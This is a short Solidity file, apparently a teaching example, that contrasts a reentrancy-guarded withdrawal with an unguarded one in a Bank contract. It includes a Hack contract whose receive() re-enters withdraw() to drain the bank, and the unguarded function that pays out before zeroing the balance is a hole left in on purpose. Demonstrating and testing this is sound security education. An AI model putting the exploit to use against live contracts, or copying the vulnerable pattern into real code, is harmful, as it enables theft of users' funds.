// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

abstract contract ReentrancyGuard {
    bool private locked;

    modifier lock() {
        require(!locked, "locked");
        locked = true;
        _;
        locked = false;
    }
}

contract Bank is ReentrancyGuard {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Not protected
    function withdraw() external {
        uint256 bal = balanceOf[msg.sender];
        (bool ok,) = payable(msg.sender).call{value: bal}("");
        require(ok, "transfer failed");
        balanceOf[msg.sender] = 0;
    }

    function withdrawProtected() external lock {
        // Note: this code is vulnerable to re-entrancy without the lock
        uint256 bal = balanceOf[msg.sender];
        (bool ok,) = payable(msg.sender).call{value: bal}("");
        require(ok, "transfer failed");
        balanceOf[msg.sender] = 0;
    }
}

// forge test -vvvv --match-path test/ReentrancyGuard.t.sol
contract Hack {
    address immutable target;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {
        if (target.balance >= 1e18) {
            Bank(target).withdraw();
        }
    }

    function pwn() external payable {
        Bank(target).deposit{value: 1e18}();
        Bank(target).withdraw();
    }
}